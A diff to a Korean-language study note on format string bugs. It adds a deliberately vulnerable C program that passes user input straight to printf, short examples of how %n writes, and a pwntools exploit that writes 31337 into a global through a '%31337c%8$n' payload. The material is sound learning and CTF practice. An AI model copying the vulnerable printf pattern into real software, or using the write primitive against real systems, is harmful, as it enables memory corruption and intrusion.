@@ -185,3 +185,57 @@ p.interactive()
 여기서, sendlineafter로 하면 작동을 안하는데, LLM에게 물어보니 다음과 같이 답변했다. 참고하자.
 
 > sendlineafter가 안 됐던 이유는 타이밍 문제였을 가능성이 높습니다. recvline()으로 주소를 읽고 난 직후 Format:  프롬프트가 이미 수신 버퍼에 도착해 있는데, sendlineafter가 그걸 받기 전에 타임아웃이 났거나 내부 버퍼 처리 순서가 꼬인 것입니다.
+
+### Example Code 3 : 임의 주소 쓰기 (2026.05.12 추가)
+
+이 부분이 계속 헷갈리는 부분이라 집중하길 바란다!
+
+```c
+#include <stdio.h>
+
+int secret;
+
+int main(){
+        char format[0x100];
+
+        printf("Address of `secret`: %p\n", &secret);
+        printf("Format: ");
+        scanf("%[^\n]", format);
+        printf(format);
+
+        printf("Secret: %d", secret);
+
+        return 0;
+}
+```
+
+우선 `%n`의 사용법과 작동 원리를 간단한 예제부터 응용 예제까지 다루면서 익숙해져야한다.
+
+```c
+int count;
+printf("Hello%n", &count);
+// "Hello" = 5글자 출력
+// count = 5
+
+int a;
+printf("AA%n", &a);      // a = 2
+printf("AAAA%n", &a);    // a = 4
+printf("AAAA%1$n", &a);  // a = 4, 1번째 인자에 씀
+```
+
+이를 바탕으로, Secret에 내가 원하는 31337이라는 값을 쓰는 코드를 작성해보자.
+
+```python
+from pwn import *
+
+p = process('./fsb_aaw')
+
+p.recvuntil(b'`secret`: ')
+secret_addr = int(p.recvline()[:-1].decode(),16)
+
+fstring = b'%31337c%8$n'.ljust(16)
+fstring += p64(secret_addr)
+
+p.sendline(fstring)
+p.interactive()
+```
